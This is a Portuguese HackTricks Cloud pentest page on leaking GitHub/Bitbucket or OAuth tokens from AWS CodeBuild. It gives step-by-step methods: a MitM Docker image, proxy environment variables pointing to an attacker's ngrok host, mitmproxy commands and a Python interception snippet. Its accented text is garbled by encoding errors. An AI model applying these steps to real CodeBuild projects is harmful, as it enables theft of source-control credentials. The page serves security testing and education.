# AWS Codebuild - Vazamento de Token

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

## Recuperar Tokens Configurados do Github/Bitbucket

### Via Imagem Docker

Se voc√™ descobrir que a autentica√ß√£o, por exemplo, para o Github est√° configurada na conta, voc√™ pode **exfiltrar** esse **acesso** (**token GH ou token OAuth**) fazendo com que o Codebuild **use uma imagem Docker espec√≠fica** para executar a compila√ß√£o do projeto.

Para esse prop√≥sito, voc√™ pode **criar um novo projeto Codebuild** ou alterar o **ambiente** de um existente para definir a **imagem Docker**.

A imagem Docker que voc√™ pode usar √© [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). Esta √© uma imagem Docker muito b√°sica que definir√° as vari√°veis de ambiente `https_proxy`, `http_proxy` e `SSL_CERT_FILE`. Isso permitir√° que voc√™ intercepte a maior parte do tr√°fego do host indicado em `https_proxy` e `http_proxy` e confie no CERT SSL indicado em `SSL_CERT_FILE`.

1. **Crie e fa√ßa upload de sua pr√≥pria imagem Docker MitM**
   * Siga as instru√ß√µes do reposit√≥rio para definir o endere√ßo IP do seu proxy e definir seu certificado SSL e **criar a imagem Docker**.
     * **N√ÉO DEFINA `http_proxy`** para n√£o interceptar solicita√ß√µes ao endpoint de metadados.
   * Voc√™ pode usar o **`ngrok`** como `ngrok tcp 4444` para definir o proxy para sua m√°quina.
   * Depois de criar a imagem Docker, **fa√ßa o upload dela para um reposit√≥rio p√∫blico** (Dockerhub, ECR...)
2. **Defina o ambiente**
   * Crie um **novo projeto Codebuild** ou **modifique** o ambiente de um existente.
   * Defina o projeto para usar a **imagem Docker gerada anteriormente**
   *

       <figure><img src="../../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
3. **Defina o proxy MitM em sua m√°quina**
   * Como indicado no **reposit√≥rio do Github**, voc√™ pode usar algo como: `mitmproxy --listen-port 4444 --set block_global=false --allow-hosts "github.com"`
4. **Execute a compila√ß√£o e capture as credenciais**
   * Voc√™ pode ver o token no cabe√ßalho Authorization:

       <figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

### Via protocolo HTTP

{% hint style="success" %}
**Essa vulnerabilidade foi corrigida pela AWS em algum momento na semana de 20 de fevereiro de 2023 (acho que na sexta-feira). Portanto, um invasor n√£o pode mais abusar dela :)**
{% endhint %}

Um invasor com **permiss√µes elevadas em um CodeBuild poderia vazar o token Github/Bitbucket** configurado ou, se as permiss√µes fossem configuradas via OAuth, o **token OAuth tempor√°rio usado para acessar o c√≥digo**.

* Um invasor poderia adicionar as vari√°veis de ambiente **http\_proxy** e **https\_proxy** ao projeto CodeBuild apontando para sua m√°quina (por exemplo, `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

* Em seguida, altere a URL do reposit√≥rio do github para usar HTTP em vez de HTTPS, por exemplo: **http://**github.com/carlospolop-forks/TestActions
* Em seguida, execute o exemplo b√°sico de [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) na porta apontada pelas vari√°veis de proxy (http\_proxy e https\_proxy)

```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
    host="127.0.0.1",
    port=4444,
    protocols=[protocol.HTTP], 
    middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
    certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```

* Finalmente, clique em **Build the project**, as **credenciais** ser√£o **enviadas em texto claro** (base64) para a porta mitm:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Agora um invasor poder√° usar o token de sua m√°quina, listar todos os privil√©gios que ele tem e (ab)usar mais facilmente do que usando o servi√ßo CodeBuild diretamente.
{% endhint %}

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>